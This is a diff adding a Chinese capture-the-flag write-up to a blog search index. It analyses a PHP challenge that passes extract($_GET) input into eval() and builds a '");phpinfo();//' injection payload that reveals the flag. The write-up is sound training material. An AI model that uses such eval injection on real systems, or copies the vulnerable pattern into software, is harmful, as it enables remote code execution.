@@ -171,4 +171,97 @@
         <tag>ECB、CBC、CFB、OFB、CTR</tag>
       </tags>
   </entry>
+  <entry>
+    <title>DASCTF Oct X 迷路的魔法少女</title>
+    <url>/2022/04/21/DASCTF-Oct-X-%E8%BF%B7%E8%B7%AF%E7%9A%84%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="观察源码"><a href="#观察源码" class="headerlink" title="观察源码"></a>观察源码</h1><p>进入靶场发现直接给了源码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function-definition function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$array = <span class="token interpolation"><span class="token variable">$data</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrvalue</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'array('</span><span class="token punctuation">;</span>
+        <span class="token variable">$attrids</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$attrids</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"=>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$attrvalue</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$attrids</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#123;</span>
+                <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$attrstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><p>先来看看其中的<code>String2Array()</code>函数，我在<a href="https://blog.csdn.net/weixin_36440677/article/details/115629343">其它博客</a>中看到了这么个说法：</p>
+<blockquote>
+<p>PHP CMS中 很常用的string2array函数：</p>
+<pre class="line-numbers language-none"><code class="language-none">function string2array($data)&#123;undefined
+
+if($data &#x3D;&#x3D; &#39;&#39;)&#123;undefined
+	return array();
+&#125;
+	eval(&quot;\$array &#x3D; $data;&quot;)
+	return $array;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里必须使用eval函数才能将“字符串”变成一个真正的数组</p>
+</blockquote>
+<p>好家伙，直接给答案了相当于。所以这边 String2Array($data) 这个函数要想利用data得到一个数组。更全面的：将GET方法传的参数编程数组之后通过<code>eval()</code>函数进行赋值给另外一个变量，但是这里将字符串转换成数组的过程没有进行任何过滤，导致输入的内容很容易就逃逸出数组的范围，造成任意命令执行。</p>
+<h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><p>再来观察观察字符赋值的内容：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrvalue</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'array('</span><span class="token punctuation">;</span>
+        <span class="token variable">$attrids</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$attrids</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"=>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$attrvalue</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$attrids</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#123;</span>
+                <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先我们应该知道的是，在php中点 <code>.</code> 的意思为“连接”，指的是字符串连接符，可以用来将两个或两个以上的字符串拼接在一起，形成一个新的字符串；具体语法格式为：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$string</span> <span class="token operator">=</span> string1<span class="token operator">.</span>string2<span class="token operator">.</span>string3<span class="token operator">.</span> ······ <span class="token operator">.</span>stringn<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>还应该知道在php中数组默认键名是整数，也可以自己定义任意字符键名（最好是有实际意义），如：　</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$css</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'style'</span><span class="token operator">=></span><span class="token string single-quoted-string">'0'</span>，<span class="token string single-quoted-string">'color'</span><span class="token operator">=></span><span class="token string single-quoted-string">'green'</span><span class="token punctuation">)</span>；
+则<span class="token variable">$css</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'style'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'0'</span>，<span class="token variable">$css</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'color'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'green'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>所以上面这段代码也就明了了，通过循环将传入的两个数组进行字符串的拼接来构成一个生成数组的字符串。但是我们通过观察发现，如果传入<code>&quot;);//</code>这样的方式，就能够把数组闭合起来，而且还能将后面的内容给注释掉，相当于SQL注入闭合掉拼接的语句那样：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$attrstr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"xxxxx);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>更进一步在<code>;</code>后面输入另外一条语句，如<code>&quot;);phpinfo();//</code>：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$attrstr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"xxxxx);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这么一来就能够任意代码执行了，转化为payload即为：</p>
+<pre class="line-numbers language-none"><code class="language-none">?attrid[0]&#x3D;0&amp;attrvalue[0]&#x3D;&quot;);phpinfo();&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>于打印出php的信息中，CTRL+F调出搜索框搜索即可找到flag</p>
+<p><img src="/2022/04/21/DASCTF-Oct-X-%E8%BF%B7%E8%B7%AF%E7%9A%84%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3/image-20220421212817263.png" alt="image-20220421212817263" loading="lazy"></p>
+<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>Tokyo flag{211eecb4-39db-4e2b-b404-402ff5442b0f}</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>WEB</tag>
+      </tags>
+  </entry>
 </search>
